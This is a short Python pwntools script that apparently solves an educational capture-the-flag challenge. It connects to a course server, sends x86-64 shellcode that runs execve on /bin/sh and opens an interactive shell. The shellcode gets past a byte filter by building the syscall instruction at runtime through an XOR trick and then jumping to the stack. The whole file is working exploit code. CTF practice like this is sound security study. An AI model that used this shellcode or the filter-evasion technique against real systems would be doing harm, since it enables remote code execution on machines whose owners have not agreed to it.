#!usr/bin/env python

from pwn import *

context.arch = 'amd64'

y = remote( 'edu-ctf.csie.org', 10150)
#y = process('./shellc0de')

#execve("bin/sh")
# sc = b"\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"
sc = b"\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b"

payload = """
            mov bx, 0x010b
            xor bx, 0x0404
            push bx
            jmp rsp
          """
another_payload = """
                    xor rdi, rdi
                    xor rsi, rsi
                    xor rdx, rdx
                    xor rax, rax
                    push rax
                    mov rbx,0x68732f2f6e69622f
                    push rbx
                    mov rdi, rsp 
                    mov al, 0x3b
                    mov bx, 0x010b
                    xor bx, 0x0404
                    push bx
                    jmp rsp
                  """

sc += asm(payload)
another_sc = asm(another_payload)
y.sendafter('>', another_sc )

y.interactive()
